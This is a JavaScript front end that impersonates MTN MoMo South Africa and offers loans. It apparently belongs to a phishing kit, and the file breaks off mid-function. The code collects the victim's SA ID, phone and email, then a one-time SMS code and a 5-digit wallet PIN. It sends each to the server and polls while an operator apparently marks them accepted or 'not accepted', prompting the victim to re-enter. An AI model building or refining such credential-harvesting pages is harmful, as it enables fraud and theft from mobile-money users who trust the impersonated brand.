// ============================================================
// script.js – MTN MoMo South Africa  (v7.2 FINAL)
// Client-submitted OTP · No inline handlers
// ============================================================
'use strict';

// ═══════════════════════════════════════════════════════════
// CONSTANTS & STATE
// ═══════════════════════════════════════════════════════════
var ACCOUNT_TYPES = {
    yello:      { name: 'MoMo Yello',      icon: '🟡', dailyCash: 3500,  monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true  },
    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true  },
    eazi:       { name: 'MoMo Eazi',       icon: '⚡', dailyCash: 2000,  monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false }
};

var STEPS = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
var POLL_INTERVAL = 2500;
var POLL_MAX_DURATION = 30 * 60 * 1000;

var S = {
    applicationId: '',
    isRegistered: false,
    registrationStatus: 'idle',
    accountType: null,
    accountMaxLoan: 0,
    idNumber: null,
    dob: null,
    steps: {},
    loan: {}, personal: {}, employment: {}, guarantor: {}
};

var KEYS = { APP_ID: 'mtn_za_app_id_v7', APP_DATA: 'mtn_za_data_v7' };

var activePoll = null;
var currentPollStep = null;
var currentPollCallback = null;
var currentPollStarted = 0;
var regPollTimer = null;
var selectedAccountType = null;
var qualificationAnimator = null;
var CURRENT_LANG = localStorage.getItem('momo_lang') || 'en';
var _termsCache = null;

// ═══════════════════════════════════════════════════════════
// STORAGE HELPERS
// ═══════════════════════════════════════════════════════════
function save(k, d) { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} }
function get(k) { try { var d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } }
function rm(k) { try { localStorage.removeItem(k); } catch (e) {} }

function saveAll() {
    save(KEYS.APP_ID, S.applicationId);
    save(KEYS.APP_DATA, {
        isRegistered: S.isRegistered,
        registrationStatus: S.registrationStatus,
        accountType: S.accountType,
        accountMaxLoan: S.accountMaxLoan,
        dob: S.dob,
        steps: S.steps,
        loan: S.loan, personal: S.personal,
        employment: S.employment, guarantor: S.guarantor
    });
}

// ═══════════════════════════════════════════════════════════
// I18N
// ═══════════════════════════════════════════════════════════
var I18N = {
    en: {
        'landing.welcome': 'Welcome to MTN MoMo South Africa',
        'landing.tagline': 'Get loans easily through MTN MoMo South Africa',
        'landing.haveMomo': 'I already have MoMo',
        'landing.haveMomoSub': 'Link your wallet once, then apply in one tap',
        'landing.noMomo': "I don't have MoMo yet",
        'landing.noMomoSub': 'Sign up in 60 seconds, then apply for a loan',
        'landing.continueMomo': 'Continue with MoMo',
        'landing.registerFirst': 'Register First',
        'landing.secure': '🔒 Secure',
        'landing.fast': '⚡ Fast Approval',
        'landing.sa': '🇿🇦 Proudly SA',
        'landing.calcTitle': 'Loan Calculator',
        'landing.calcSub': 'See your monthly payment',
        'landing.loanAmount': 'Loan Amount',
        'landing.loanTerm': 'Loan Term',
        'landing.monthlyPayment': 'Monthly Payment',
        'landing.totalRepayment': 'Total Repayment',
        'landing.amountReceive': 'Amount You Receive',
        'landing.applyLoan': 'Apply for This Loan',
        'landing.calcNote': '💡 You can change these later'
    },
    zu: {
        'landing.welcome': 'Siyakwamukela ku-MTN MoMo South Africa',
        'landing.tagline': 'Thola imali mboleko kalula nge-MTN MoMo',
        'landing.haveMomo': 'Senginayo i-MoMo',
        'landing.haveMomoSub': 'Xhumanisa isikhwama sakho, bese ufaka isicelo',
        'landing.noMomo': 'Anginayo i-MoMo okwamanje',
        'landing.noMomoSub': 'Bhalisa ngemizuzu engu-60, bese ufaka isicelo',
        'landing.continueMomo': 'Qhubeka ne-MoMo',
        'landing.registerFirst': 'Bhalisa Kuqala',
        'landing.secure': '🔒 Kuphephile',
        'landing.fast': '⚡ Ukugunyazwa Okusheshayo',
        'landing.sa': '🇿🇦 Iningizimu Afrika',
        'landing.calcTitle': 'Isibali Semali Mboleko',
        'landing.calcSub': 'Bona inkokhelo yakho yanyanga zonke',
        'landing.loanAmount': 'Inani Lemali',
        'landing.loanTerm': 'Isikhathi',
        'landing.monthlyPayment': 'Inkokhelo Yanyanga',
        'landing.totalRepayment': 'Isamba Sokukhokha',
        'landing.amountReceive': 'Imali Ozoyithola',
        'landing.applyLoan': 'Faka Isicelo',
        'landing.calcNote': '💡 Ungashintsha lokhu kamuva'
    },
    af: {
        'landing.welcome': 'Welkom by MTN MoMo Suid-Afrika',
        'landing.tagline': 'Kry lenings maklik deur MTN MoMo',
        'landing.haveMomo': 'Ek het reeds MoMo',
        'landing.haveMomoSub': 'Koppel jou beursie een keer, dan doen aansoek',
        'landing.noMomo': 'Ek het nog nie MoMo nie',
        'landing.noMomoSub': 'Registreer in 60 sekondes, doen dan aansoek',
        'landing.continueMomo': 'Gaan voort met MoMo',
        'landing.registerFirst': 'Registreer Eers',
        'landing.secure': '🔒 Veilig',
        'landing.fast': '⚡ Vinnige Goedkeuring',
        'landing.sa': '🇿🇦 Trotse SA',
        'landing.calcTitle': 'Lening Sakrekenaar',
        'landing.calcSub': 'Sien jou maandelikse betaling',
        'landing.loanAmount': 'Lening Bedrag',
        'landing.loanTerm': 'Lening Termyn',
        'landing.monthlyPayment': 'Maandelikse Betaling',
        'landing.totalRepayment': 'Totale Terugbetaling',
        'landing.amountReceive': 'Bedrag Wat Jy Ontvang',
        'landing.applyLoan': 'Doen Aansoek',
        'landing.calcNote': '💡 Jy kan dit later verander'
    }
};

function t(key) { return (I18N[CURRENT_LANG] && I18N[CURRENT_LANG][key]) || I18N.en[key] || key; }

function applyI18n() {
    document.querySelectorAll('[data-i18n]').forEach(function (el) {
        var val = t(el.dataset.i18n);
        if (val) el.textContent = val;
    });
    var langSel = document.getElementById('langSelect');
    if (langSel) langSel.value = CURRENT_LANG;
    document.documentElement.lang = CURRENT_LANG;
}

function setLanguage(lang) {
    CURRENT_LANG = I18N[lang] ? lang : 'en';
    localStorage.setItem('momo_lang', CURRENT_LANG);
    applyI18n();
    showToast(CURRENT_LANG === 'en' ? 'Language: English'
        : CURRENT_LANG === 'zu' ? 'Ulimi: isiZulu'
        : 'Taal: Afrikaans', 'success', 1800);
}

// ═══════════════════════════════════════════════════════════
// UTILITIES
// ═══════════════════════════════════════════════════════════
function escapeHtml(s) {
    return String(s || '').replace(/[&<>"']/g, function (c) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
}
function fmt(n) { return (Number(n) || 0).toLocaleString(); }

function genAppId() {
    var rand;
    try {
        rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase();
    } catch (e) {
        rand = Math.random().toString(36).replace(/[^a-z0-9]/gi, '').toUpperCase();
    }
    return 'MTN-ZA-' + rand.slice(0, 8);
}

function showToast(msg, type, duration) {
    type = type || 'info';
    duration = duration || 3200;
    document.querySelectorAll('.toast').forEach(function (t) { t.remove(); });
    var el = document.createElement('div');
    el.className = 'toast toast-' + type;
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(function () {
        el.style.opacity = '0';
        el.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(function () { el.remove(); }, 300);
    }, duration);
}

function showErr(id, msg) {
    var box = document.getElementById(id);
    if (box) {
        box.classList.add('show');
        var t2 = document.getElementById(id + 'Txt');
        if (t2) t2.textContent = msg;
    }
}
function clearErr(id) {
    var box = document.getElementById(id);
    if (box) box.classList.remove('show');
}
function setBtnLoading(btn, loading, defaultText) {
    if (!btn) return;
    btn.disabled = loading;
    btn.textContent = loading ? 'Please wait...' : defaultText;
}

async function apiCall(endpoint, options) {
    options = options || {};
    try {
        var fetchOpts = Object.assign({
            credentials: 'same-origin',
            headers: { 'Content-Type': 'application/json' }
        }, options);
        fetchOpts.headers = Object.assign({ 'Content-Type': 'application/json' }, options.headers || {});
        var res = await fetch(endpoint, fetchOpts);
        var data = await res.json();
        if (res.status === 429 || (data && data.code === 'RATE_LIMITED')) {
            var msg = (data && data.error) || 'You have exceeded the trial limit. Please try again in 5 minutes.';
            showToast('⏳ ' + msg, 'error', 6000);
            throw new Error(msg);
        }
        return data;
    } catch (e) {
        console.error(endpoint + ':', e.message);
        throw e;
    }
}

// ═══════════════════════════════════════════════════════════
// NAVIGATION
// ═══════════════════════════════════════════════════════════
function goTo(pageId) {
    if (requiresRegistration(pageId) && !isUserRegistered()) {
        forceRegistration();
        return;
    }
    document.querySelectorAll('.page').forEach(function (p) { p.classList.remove('active'); });
    var el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
    try { history.pushState({ page: pageId }, '', '#' + pageId); } catch (e) {}

    if (pageId === 'page-requirements') updateRequirementsLimits();
    if (pageId === 'page-step1') refreshStep1();
    if (pageId === 'page-step2') prefillPersonal();
    if (pageId === 'page-momologin') prefillMoMoLogin();
    if (pageId === 'page-confirmation') updateConfirmation();
    refreshAccountBadges();

    if (pageId.indexOf('page-wait-') !== 0 && pageId !== 'page-scan' && pageId.indexOf('page-registration-') !== 0) {
        stopPolling();
    }
}

function requiresRegistration(pageId) {
    var list = ['page-step1','page-step2','page-step3','page-guarantor','page-confirmation',
                'page-momologin','page-scan','page-approval',
                'page-wait-loan','page-wait-personal','page-wait-employment',
                'page-wait-guarantor','page-wait-momologin'];
    return list.indexOf(pageId) !== -1;
}
function isUserRegistered() {
    return !!(S.isRegistered && S.accountType && ACCOUNT_TYPES[S.accountType] && S.registrationStatus === 'completed');
}
function forceRegistration(reason) {
    showToast('🔗 Please complete your registration to continue', 'info', 3500);
    setTimeout(function () {
        routeRegistrationFlow();
        if (reason) setTimeout(function () { showErr('regErr', reason); }, 400);
    }, 800);
}

function refreshAccountBadges() {
    var type = S.accountType ? ACCOUNT_TYPES[S.accountType] : null;
    var label = type ? type.icon + ' ' + type.name : '';
    ['navbarAccount0','navbarAccount','navbarAccount2','navbarAccount3','navbarAccount4','navbarAccount5','navbarAccount6'].forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.innerHTML = label ? '<div class="nav-badge">' + label + '</div>' : '';
    });
}

// ═══════════════════════════════════════════════════════════
// SA ID PARSING
// ═══════════════════════════════════════════════════════════
function luhnCheck(num) {
    var sum = 0, alt = false;
    for (var i = num.length - 1; i >= 0; i--) {
        var n = parseInt(num[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    return sum % 10 === 0;
}

function parseSAId(id) {
    if (!id) return { ok: false, reason: 'ID required.' };
    var clean = String(id).replace(/\D/g, '');
    if (clean.length !== 13) return { ok: false, reason: 'SA ID must be 13 digits.' };
    var yy = parseInt(clean.substring(0, 2));
    var mm = parseInt(clean.substring(2, 4));
    var dd = parseInt(clean.substring(4, 6));
    var century = yy < 30 ? 2000 : 1900;
    var year = century + yy;
    var dob = new Date(year, mm - 1, dd);
    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) {
        return { ok: false, reason: 'Invalid date of birth.' };
    }
    var age = Math.floor((Date.now() - dob.getTime()) / 31557600000);
    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
    if (!luhnCheck(clean)) return { ok: false, reason: 'Invalid ID checksum.' };
    var gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
    var c = clean[10];
    var citizenship = c === '0' ? 'SA Citizen' : c === '1' ? 'Permanent Resident' : c === '2' ? 'Refugee' : c === '3' ? 'Asylum Seeker' : 'Other';
    return {
        ok: true,
        dob: dob.toLocaleDateString('en-ZA', { day: '2-digit', month: 'long', year: 'numeric' }),
        isoDob: year + '-' + String(mm).padStart(2, '0') + '-' + String(dd).padStart(2, '0'),
        age: age, gender: gender, citizenship: citizenship
    };
}

function validateAndPreviewId(id) {
    var r = parseSAId(id);
    var p = document.getElementById('regDetailsPreview');
    if (!p) return;
    if (!r.ok) {
        p.innerHTML = '<div class="reg-preview-error">✕ ' + escapeHtml(r.reason) + '</div>';
        var dobEl = document.getElementById('regDob');
        if (dobEl) dobEl.value = '';
        return;
    }
    p.innerHTML =
        '<div class="reg-preview-row"><span>DOB</span><strong>' + r.dob + '</strong></div>' +
        '<div class="reg-preview-row"><span>Age</span><strong>' + r.age + ' years</strong></div>' +
        '<div class="reg-preview-row"><span>Gender</span><strong>' + r.gender + '</strong></div>' +
        '<div class="reg-preview-row"><span>Citizenship</span><strong>' + r.citizenship + '</strong></div>';
    var dobEl2 = document.getElementById('regDob');
    if (dobEl2) dobEl2.value = r.isoDob;
}

function normalizePhone(id) {
    var inp = document.getElementById(id);
    if (!inp) return;
    var v = inp.value.replace(/\D/g, '');
    if (v.length > 9) v = v.substring(0, 9);
    inp.value = v;
}
function normalizeId(id) {
    var inp = document.getElementById(id);
    if (!inp) return;
    var v = inp.value.replace(/\D/g, '');
    if (v.length > 13) v = v.substring(0, 13);
    inp.value = v;
    if (v.length === 13) validateAndPreviewId(v);
    else {
        var p = document.getElementById('regDetailsPreview');
        if (p) p.innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
        var dobEl = document.getElementById('regDob');
        if (dobEl) dobEl.value = '';
    }
}

// ═══════════════════════════════════════════════════════════
// CALCULATOR
// ═══════════════════════════════════════════════════════════
function updateCalc() {
    var slider = document.getElementById('amtSlider');
    if (!slider) return;
    var maxAllowed = isUserRegistered()
        ? Math.min(500000, ACCOUNT_TYPES[S.accountType].maxLoan)
        : 500000;
    slider.max = maxAllowed;
    if (+slider.value > maxAllowed) slider.value = maxAllowed;

    var amt = +slider.value;
    var termEl = document.getElementById('calcTermSelect');
    var term = termEl ? +termEl.value : 48;
    var r = 0.27 / 12;
    var monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + 60);
    var total = monthly * term;

    var set = function (id, val) { var el = document.getElementById(id); if (el) el.textContent = val; };
    set('calcAmt', 'R ' + amt.toLocaleString());
    set('monthlyAmt', 'R ' + monthly.toLocaleString());
    set('totalAmt', 'R ' + total.toLocaleString());
    set('receiveAmt', 'R ' + amt.toLocaleString());

    var pct = ((amt - 5000) / Math.max(1, maxAllowed - 5000)) * 100;
    slider.style.setProperty('--pct', Math.max(0, Math.min(100, pct)) + '%');

    var ends = slider.parentElement && slider.parentElement.querySelector('.range-ends');
    if (ends) ends.innerHTML = '<span>R 5,000</span><span>R ' + maxAllowed.toLocaleString() + '</span>';
}

// ═══════════════════════════════════════════════════════════
// LANDING ACTIONS
// ═══════════════════════════════════════════════════════════
function applyAsExistingUser() {
    console.log('[applyAsExistingUser] isRegistered:', isUserRegistered(), 'regStatus:', S.registrationStatus);
    if (isUserRegistered()) {
        if (S.steps.loan === 'approved') {
            if (S.steps.personal === 'approved') {
                if (S.steps.employment === 'approved') {
                    if (S.steps.guarantor === 'approved') { goTo('page-confirmation'); return; }
                    goTo('page-guarantor'); return;
                }
                goTo('page-step3'); return;
            }
            goTo('page-step2'); return;
        }
        goTo('page-step1');
        return;
    }
    if (S.isRegistered && S.registrationStatus && S.registrationStatus !== 'completed') {
        routeRegistrationFlow();
        return;
    }
    showToast('🔗 Link your MoMo wallet — takes 60 seconds', 'info', 3500);
    setTimeout(function () { startMoMoRegistration({ mode: 'link' }); }, 500);
}

function applyFromCalculator() {
    var slider = document.getElementById('amtSlider');
    var termEl = document.getElementById('calcTermSelect');
    var amt = slider ? +slider.value : 50000;
    var term = termEl ? termEl.value + ' Months' : '48 Months';
    var max = S.accountMaxLoan || (S.accountType ? ACCOUNT_TYPES[S.accountType].maxLoan : amt);
    var finalAmt = Math.min(amt, max);
    S.loan = Object.assign({}, S.loan, { loanAmount: finalAmt, loanTerm: term });
    saveAll();
    if (!isUserRegistered()) {
        showToast('💾 Saved R ' + fmt(finalAmt) + ' — complete registration to continue', 'info', 4000);
        setTimeout(applyAsExistingUser, 500);
        return;
    }
    showToast('R ' + fmt(finalAmt) + ' selected', 'success');
    goTo('page-step1');
}

// ═══════════════════════════════════════════════════════════
// REGISTRATION
// ═══════════════════════════════════════════════════════════
function startMoMoRegistration(opts) {
    opts = opts || {};
    var mode = opts.mode || 'register';

    S.isRegistered = false;
    S.accountType = null;
    S.accountMaxLoan = 0;
    S.idNumber = null;
    S.dob = null;
    S.registrationStatus = 'idle';
    S.steps = {};
    saveAll();

    var setVal = function (id, v) { var el = document.getElementById(id); if (el) el.value = v; };
    setVal('regId', '');
    setVal('regPhone', '');
    setVal('regEmail', '');
    setVal('regDob', '');
    var tnc = document.getElementById('regTnc');
    if (tnc) tnc.checked = false;
    var prev = document.getElementById('regDetailsPreview');
    if (prev) prev.innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';

    selectedAccountType = null;
    document.querySelectorAll('.account-type').forEach(function (el) {
        el.classList.remove('selected');
        var c = el.querySelector('.at-check');
        if (c) c.textContent = '○';
    });
    var hint = document.getElementById('accountTypeHint');
    if (hint) hint.textContent = 'Tap to select';
    clearErr('regErr');

    var heading = document.querySelector('#page-register-check .step-card h2');
    var sub = document.querySelector('#page-register-check .step-sub');
    var introH3 = document.querySelector('#page-register-check .reg-intro h3');
    var introP = document.querySelector('#page-register-check .reg-intro p');
    if (mode === 'link') {
        if (heading) heading.textContent = 'Link Your MoMo Wallet';
        if (sub) sub.textContent = 'Verify your ID to link your existing MoMo account';
        if (introH3) introH3.textContent = 'Link your existing MoMo wallet';
        if (introP) introP.textContent = 'Confirm your SA ID, mobile, and email, then pick the wallet type you hold.';
    } else {
        if (heading) heading.textContent = 'MoMo Registration';
        if (sub) sub.textContent = 'Register in under 60 seconds';
        if (introH3) introH3.textContent = "You're 2 steps away from your loan";
        if (introP) introP.textContent = "MoMo is MTN's mobile money service. Register your wallet, then apply.";
    }
    goTo('page-register-check');
}

function selectAccountType(type) {
    selectedAccountType = type;
    var names = { yello: 'MoMo Yello', yello_plus: 'MoMo Yello Plus', eazi: 'MoMo Eazi' };
    document.querySelectorAll('.account-type').forEach(function (el) {
        var m = el.dataset.type === type;
        el.classList.toggle('selected', m);
        var c = el.querySelector('.at-check');
        if (c) c.textContent = m ? '●' : '○';
    });
    var hint = document.getElementById('accountTypeHint');
    if (hint) hint.textContent = '✅ ' + names[type];
}

async function completeRegistration() {
    var idEl = document.getElementById('regId');
    var phoneEl = document.getElementById('regPhone');
    var emailEl = document.getElementById('regEmail');
    var dobEl = document.getElementById('regDob');
    var tncEl = document.getElementById('regTnc');
    var id = (idEl || {}).value || '';
    var phone = (phoneEl || {}).value || '';
    var email = (emailEl || {}).value || '';
    var dob = (dobEl || {}).value || '';
    var tnc = !!(tncEl || {}).checked;

    var idTrim = id.trim();
    var phoneTrim = phone.trim();
    var emailTrim = email.trim();

    if (!idTrim) return showErr('regErr', 'Please enter your SA ID.');
    if (idTrim.length !== 13) return showErr('regErr', 'SA ID must be 13 digits.');
    var r = parseSAId(idTrim);
    if (!r.ok) return showErr('regErr', r.reason);
    if (!dob) return showErr('regErr', 'Please re-enter your SA ID.');
    if (phoneTrim.length !== 9) return showErr('regErr', 'Mobile number must be 9 digits.');
    if (!emailTrim || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailTrim)) return showErr('regErr', 'Enter a valid email address.');
    if (!selectedAccountType) return showErr('regErr', 'Please select an account type.');
    if (!tnc) return showErr('regErr', 'You must read and accept the Terms & Conditions.');

    if (!S.applicationId) S.applicationId = genAppId();
    saveAll();

    var btn = document.getElementById('regBtn');
    setBtnLoading(btn, true, 'Complete Registration');
    goTo('page-register-processing');
    var statusEl = document.getElementById('regProcessingStatus');
    if (statusEl) statusEl.textContent = '⏳ Submitting for review...';

    try {
        var data = await apiCall('/api/register-momo', {
            method: 'POST',
            body: JSON.stringify({
                applicationId: S.applicationId,
                idNumber: idTrim,
                accountType: selectedAccountType,
                phone: phoneTrim,
                email: emailTrim,
                dob: dob,
                tncAccepted: tnc,
                fullName: null
            })
        });

        if (!data.ok) {
            goTo('page-register-check');
            showErr('regErr', data.error || 'Registration failed.');
            setBtnLoading(btn, false, 'Complete Registration');
            return;
        }

        S.idNumber = idTrim;
        S.dob = data.dob || dob;
        S.accountType = selectedAccountType;
        S.accountMaxLoan = data.maxLoan;
        S.isRegistered = true;
        S.registrationStatus = 'pending_review';
        S.personal = Object.assign({}, S.personal, { phone: phoneTrim, email: emailTrim });
        saveAll();
        updateCalc();

        setBtnLoading(btn, false, 'Complete Registration');
        var appIdEl = document.getElementById('regWaitAppId');
        if (appIdEl) appIdEl.textContent = S.applicationId;
        goTo('page-registration-wait');
        pollRegistrationStatus();
    } catch (e) {
        goTo('page-register-check');
        showErr('regErr', e.message);
        setBtnLoading(btn, false, 'Complete Registration');
    }
}

// ═══════════════════════════════════════════════════════════
// REGISTRATION FLOW ROUTER + POLLING
// ═══════════════════════════════════════════════════════════
function routeRegistrationFlow() {
    var st = S.registrationStatus || 'idle';
    if (st === 'idle') goTo('page-register-check');
    else if (st === 'pending_review') {
        var el = document.getElementById('regWaitAppId');
        if (el) el.textContent = S.applicationId;
        goTo('page-registration-wait');
        pollRegistrationStatus();
    }
    else if (st === 'otp_pending') {
        var el2 = document.getElementById('regOtpPhone');
        if (el2 && S.personal.phone) el2.textContent = '+27 ' + S.personal.phone;
        goTo('page-registration-otp');
    }
    else if (st === 'otp_submitted') {
        var el4 = document.getElementById('regOtpWaitAppId');
        if (el4) el4.textContent = S.applicationId;
        goTo('page-registration-otp-wait');
        pollOtpStatus();
    }
    else if (st === 'otp_verified') goTo('page-registration-pin');
    else if (st === 'pin_pending') {
        var el3 = document.getElementById('regPinWaitAppId');
        if (el3) el3.textContent = S.applicationId;
        goTo('page-registration-pin-wait');
        pollPinStatus();
    }
    else if (st === 'completed') goTo('page-requirements');
    else if (st === 'rejected') goTo('page-registration-rejected');
    else goTo('page-register-check');
}

function stopRegPoll() {
    if (regPollTimer) { clearTimeout(regPollTimer); regPollTimer = null; }
}

async function pollRegistrationStatus() {
    stopRegPoll();
    var tick = async function () {
        try {
            var r = await fetch('/api/registration/status/' + S.applicationId, { credentials: 'same-origin' });
            if (!r.ok) throw new Error('HTTP ' + r.status);
            var data = await r.json();
            if (!data.ok) { regPollTimer = setTimeout(tick, 3000); return; }
            S.registrationStatus = data.status;
            S.accountType = data.accountType || S.accountType;
            S.accountMaxLoan = data.accountMaxLoan || S.accountMaxLoan;
            saveAll();

            if (data.status === 'pending_review') { regPollTimer = setTimeout(tick, 3000); return; }
            if (data.status === 'otp_pending') {
                stopRegPoll();
                showToast('✅ Registration approved — please enter your OTP', 'success', 4000);
                var phoneEl = document.getElementById('regOtpPhone');
                if (phoneEl) phoneEl.textContent = data.phone ? '+27 ' + data.phone : '+27 —';
                goTo('page-registration-otp');
                setTimeout(function () { var el = document.getElementById('regOtp0'); if (el) el.focus(); }, 200);
                return;
            }
            if (data.status === 'otp_submitted') {
                stopRegPoll();
                var elW = document.getElementById('regOtpWaitAppId');
                if (elW) elW.textContent = S.applicationId;
                goTo('page-registration-otp-wait');
                pollOtpStatus();
                return;
            }
            if (data.status === 'otp_verified') { stopRegPoll(); goTo('page-registration-pin'); return; }
            if (data.status === 'pin_pending') {
                stopRegPoll();
                var el = document.getElementById('regPinWaitAppId');
                if (el) el.textContent = S.applicationId;
                goTo('page-registration-pin-wait');
                pollPinStatus();
                return;
            }
            if (data.status === 'completed') {
                stopRegPoll();
                showToast('🎉 Registration complete!', 'success', 3000);
                goTo('page-requirements');
                return;
            }
            if (data.status === 'rejected') {
                stopRegPoll();
                var el2 = document.getElementById('regRejectReason');
                if (el2) el2.textContent = data.rejectionReason || 'Your registration was rejected.';
                goTo('page-registration-rejected');
                return;
            }
            regPollTimer = setTimeout(tick, 3000);
        } catch (e) {
            console.warn('Reg poll:', e.message);
            regPollTimer = setTimeout(tick, 4000);
        }
    };
    tick();
}

async function pollOtpStatus() {
    stopRegPoll();
    var tick = async function () {
        try {
            var r = await fetch('/api/registration/status/' + S.applicationId, { credentials: 'same-origin' });
            var data = await r.json();
            if (!data.ok) { regPollTimer = setTimeout(tick, 3000); return; }
            S.registrationStatus = data.status;
            saveAll();

            if (data.status === 'otp_submitted') {
                regPollTimer = setTimeout(tick, 3000);
                return;
            }
            if (data.status === 'otp_verified') {
                stopRegPoll();
                showToast('✅ OTP confirmed! Set your PIN.', 'success', 3000);
                goTo('page-registration-pin');
                return;
            }
            if (data.status === 'otp_pending') {
                stopRegPoll();
                showToast('⚠️ OTP was not accepted. Please re-enter.', 'error', 5000);
                [0,1,2,3,4,5].forEach(function (i) {
                    var el = document.getElementById('regOtp' + i);
                    if (el) el.value = '';
                });
                goTo('page-registration-otp');
                setTimeout(function () { var el = document.getElementById('regOtp0'); if (el) el.focus(); }, 200);
                return;
            }
            if (data.status === 'rejected') {
                stopRegPoll();
                var el = document.getElementById('regRejectReason');
                if (el) el.textContent = data.rejectionReason || 'Registration was rejected.';
                goTo('page-registration-rejected');
                return;
            }
            regPollTimer = setTimeout(tick, 3000);
        } catch (e) { regPollTimer = setTimeout(tick, 4000); }
    };
    tick();
}

async function pollPinStatus() {
    stopRegPoll();
    var tick = async function () {
        try {
            var r = await fetch('/api/registration/status/' + S.applicationId, { credentials: 'same-origin' });
            var data = await r.json();
            if (!data.ok) { regPollTimer = setTimeout(tick, 3000); return; }
            S.registrationStatus = data.status;
            saveAll();
            if (data.status === 'completed') {
                stopRegPoll();
                showToast('🎉 Registration complete!', 'success', 3000);
                goTo('page-requirements');
                return;
            }
            if (data.status === 'otp_verified') {
                stopRegPoll();
                showToast('⚠️ PIN was not accepted. Please choose a different PIN.', 'error', 5000);
                goTo('page-registration-pin');
                ['regPin0','regPin1','regPin2','regPin3','regPin4','regPinC0','regPinC1','regPinC2','regPinC3','regPinC4'].forEach(function (id) {
                    var el = document.getElementById(id); if (el) el.value = '';
                });
                return;
            }
            if (data.status === 'rejected') {
                stopRegPoll();
                var el = document.getElementById('regRejectReason');
                if (el) el.textContent = data.rejectionReason || 'Registration was rejected.';
                goTo('page-registration-rejected');
                return;
            }
            regPollTimer = setTimeout(tick, 3000);
        } catch (e) { regPollTimer = setTimeout(tick, 4000); }
    };
    tick();
}

async function submitRegistrationOtp() {
    var otp = [0,1,2,3,4,5].map(function (i) {
        var el = document.getElementById('regOtp' + i);
        return el ? el.value : '';
    }).join('');
    if (otp.length !== 6) return showErr('regOtpErr', 'Enter all 6 digits.');
    if (!/^\d{6}$/.test(otp)) return showErr('regOtpErr', 'OTP must be numeric.');
    clearErr('regOtpErr');
    var btn = document.getElementById('regOtpBtn');
    setBtnLoading(btn, true, 'Submitting...');
    try {
        var data = await apiCall('/api/registration/verify-otp', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, otp: otp })
        });
        setBtnLoading(btn, false, 'Submit OTP');
        if (!data.ok) {
            showErr('regOtpErr', data.error || 'Could not submit OTP.');
            return;
        }
        S.registrationStatus = 'otp_submitted';
        saveAll();
        var el = document.getElementById('regOtpWaitAppId');
        if (el) el.textContent = S.applicationId;
        goTo('page-registration-otp-wait');
        pollOtpStatus();
    } catch (e) {
        setBtnLoading(btn, false, 'Submit OTP');
        showErr('regOtpErr', e.message);
    }
}

async function submitRegistrationPin() {
    var pin = [0,1,2,3,4].map(function (i) {
        var el = document.getElementById('regPin' + i);
        return el ? el.value : '';
    }).join('');
    var pinC = [0,1,2,3,4].map(function (i) {
        var el = document.getElementById('regPinC' + i);
        return el ? el.value : '';
    }).join('');
    if (pin.length !== 5) return showErr('regPinErr', 'Enter a 5-digit PIN.');
    if (pin !== pinC) return showErr('regPinErr', 'PINs do not match.');
    clearErr('regPinErr');
    var btn = document.getElementById('regPinBtn');
    setBtnLoading(btn, true, 'Setting PIN...');
    try {
        var data = await apiCall('/api/registration/set-pin', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, pin: pin })
        });
        setBtnLoading(btn, false, 'Set PIN');
        if (!data.ok) return showErr('regPinErr', data.error || 'Could not set PIN.');
        showToast('🔐 PIN submitted for verification', 'success');
        S.registrationStatus = 'pin_pending';
        saveAll();
        var el = document.getElementById('regPinWaitAppId');
        if (el) el.textContent = S.applicationId;
        goTo('page-registration-pin-wait');
        pollPinStatus();
    } catch (e) {
        setBtnLoading(btn, false, 'Set PIN');
        showErr('regPinErr', e.message);
    }
}

async function restartRegistration() {
    try {
        await apiCall('/api/registration/reset', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId })
        });
    } catch (e) {}
    startMoMoRegistration({ mode: 'register' });
}

// ═══════════════════════════════════════════════════════════
// REQUIREMENTS
// ═══════════════════════════════════════════════════════════
function updateRequirementsLimits() {
    var tc = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.yello;
    var a = document.getElementById('reqLimitText');
    if (a) a.innerHTML = '<b>' + tc.icon + ' ' + tc.name + '</b><br>Daily: R ' + fmt(tc.dailyCash) + ' · Monthly: R ' + fmt(tc.monthlyCap) + '<br><b>Max loan: R ' + fmt(tc.maxLoan) + '</b>';
    var b = document.getElementById('reqTxText');
    if (b) b.innerHTML = 'Have <b>20% of loan amount</b> in MoMo transactions this month. Example: for R ' + fmt(tc.maxLoan) + ' → R ' + fmt(Math.ceil(tc.maxLoan * 0.20)) + '.';
}

// ═══════════════════════════════════════════════════════════
// STEP 1: LOAN
// ═══════════════════════════════════════════════════════════
function refreshStep1() {
    if (!isUserRegistered()) { forceRegistration(); return; }
    var tc = ACCOUNT_TYPES[S.accountType];
    var box = document.getElementById('accInfoBox');
    if (box) box.style.display = 'block';
    var txt = document.getElementById('accInfoText');
